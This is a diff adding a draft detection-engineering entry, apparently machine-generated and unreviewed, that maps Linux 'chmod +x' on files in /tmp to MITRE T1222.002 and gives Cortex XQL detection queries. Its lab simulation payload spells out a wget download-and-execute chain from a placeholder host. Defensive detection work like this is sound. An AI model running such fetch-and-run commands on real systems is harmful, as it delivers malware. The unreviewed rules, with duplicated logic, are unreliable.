@@ -1,0 +1,147 @@
+{
+  "id": "TTP-0000-0034",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-linux",
+      "endpoint",
+      "source-not-recorded"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "linux"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Linux Endpoint: Adding Execution Privileges via chmod +x",
+    "summary": "An attacker downloads a binary to /tmp, sets execution permissions using chmod +x, and then executes it. Cortex should detect the chmod +x operation as a deviation from normal behavior.",
+    "description": "An attacker downloads a binary to /tmp, sets execution permissions using chmod +x, and then executes it. Cortex should detect the chmod +x operation as a deviation from normal behavior."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1222",
+        "subtechnique_id": "T1222.002",
+        "name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "root",
+    "payload": {
+      "interpreter": "bash",
+      "code": "wget -O /tmp/malware.bin http://192.0.2.5/malware\nchmod +x /tmp/malware.bin\n/tmp/malware.bin",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Process start of chmod command",
+        "expected_value": "action_process_image_name = '/bin/chmod'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "File path of the binary with execution permissions",
+        "expected_value": "action_file_path = '/tmp/malware.bin'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Adding execution privileges",
+        "description": "Detection of chmod +x being executed on a file in /tmp",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/bin/chmod' and action_file_path like '/tmp/%'\n| filter action_process_command_line like '%+x%'",
+        "mitre_technique_ids": [
+          "T1222.002"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Adding execution privileges",
+        "description": "Machine learning model detecting anomalous chmod +x usage on files in /tmp",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/bin/chmod' and action_file_path like '/tmp/%'\n| filter action_process_command_line like '%+x%'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "action_process_image_name = '/bin/chmod' and action_file_path like '/tmp/%'",
+        "mitre_technique_ids": [
+          "T1222.002"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect chmod +x on /tmp files",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/bin/chmod' and action_file_path like '/tmp/%'\n| filter action_process_command_line like '%+x%'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Adding execution privileges; Required Data: XDR Agent; ATT&CK T1222.002. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "MITRE ATT&CK T1222.002",
+      "url": "https://attack.mitre.org/techniques/T1222/002/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
